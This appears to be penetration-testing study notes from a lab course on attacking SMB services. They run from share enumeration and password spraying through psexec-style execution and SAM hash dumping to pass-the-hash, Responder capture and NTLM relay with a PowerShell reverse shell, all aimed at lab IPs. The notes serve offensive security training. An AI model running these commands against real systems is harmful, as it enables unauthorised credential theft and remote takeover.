#### **Nmap**
`EmaadAbbasi@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445`

| **Command**                                       | **Description**                                           |
| ------------------------------------------------- | --------------------------------------------------------- |
| `smbclient -N -L //<FQDN/IP>`                     | Null session authentication on SMB.                       |
| `smbclient //<FQDN/IP>/<share>`                   | Connect to a specific SMB share.                          |
| `rpcclient -U "" <FQDN/IP>`                       | Interaction with the target using RPC.                    |
| `impacket-samrdump <FQDN/IP>`                     | Username enumeration using Impacket scripts.              |
| `smbmap -H <FQDN/IP>`                             | Enumerating SMB shares.                                   |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng <FQDN/IP> -A`                      | SMB enumeration using enum4linux.                         |
**Note**:  Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (`!<cmd>`) without interrupting the connection.

### **Add a share to SAMBA**

```
# Add following to /etc/samba/smb.conf

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no


# Restart Samba
sudo systemctl restart smbd
```

### Brute Forcing
**Password Spraying**

```shell-session
Orbixio@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
**Dictionary Attack**
```shell-session
Orbixio@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```

> [!ERROR] Error Hydra
> `[ERROR] invalid reply from target smb://10.129.42.197:445/`
> This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

```shell-session
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts
```
Execution as Administrator

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

```shell-session
Orbixio@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

The same options apply to `impacket-smbexec` and `impacket-atexec`.

```shell-session
# Execution using cme
Orbixio@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerate logged-users
Orbixio@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Dump SAM hashes
Orbixio@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Login with hash
Orbixio@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```


Forced Auth Attacks

```shell-session
Orbixio@htb[/htb]$ responder -I <interface name>
```

```shell-session
Orbixio@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**NTLM Relay Attack**
If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). 

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
Orbixio@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell-session
Orbixio@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 goes here>'
```

```shell-session
Orbixio@htb[/htb]$ nc -lvnp 9001
```

[SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)

https://www.exploit-db.com/exploits/48537
## **Further Refrences**

- [[RPC Client]]
- https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
- https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html


